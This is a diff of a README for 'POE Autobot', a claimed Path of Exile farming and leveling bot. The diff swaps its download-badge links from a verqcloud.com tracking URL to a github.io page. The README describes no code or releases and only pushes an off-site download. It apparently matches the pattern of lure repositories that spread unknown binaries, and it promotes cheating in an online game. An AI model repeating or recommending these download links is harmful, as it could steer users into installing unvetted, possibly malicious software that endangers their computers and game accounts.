@@ -2,7 +2,7 @@
 
 **POE Autobot** is an automation tool for **Path of Exile (POE)**, designed to streamline gameplay by automating repetitive tasks such as farming, leveling, item collection, and more. This tool enhances your gaming experience by saving you time and effort, allowing you to focus on the strategic aspects of the game while the bot handles the tedious tasks.
 
-[![Download POE AutoBot](https://img.shields.io/badge/Download-POE%20AutoBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download POE AutoBot](https://img.shields.io/badge/Download-POE%20AutoBot-blueviolet)](https://poe-autobot.github.io/.github/)
 
 ## Features
 
@@ -21,4 +21,5 @@
 4. Launch **POE**, and activate the autobot using the designated hotkey for automation.
 5. Configure the bot settings to suit your desired tasks (farming locations, leveling, etc.).
 
-[![Download POE AutoBot](https://img.shields.io/badge/Download-POE%20AutoBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download POE AutoBot](https://img.shields.io/badge/Download-POE%20AutoBot-blueviolet)](https://poe-autobot.github.io/.github/)
+
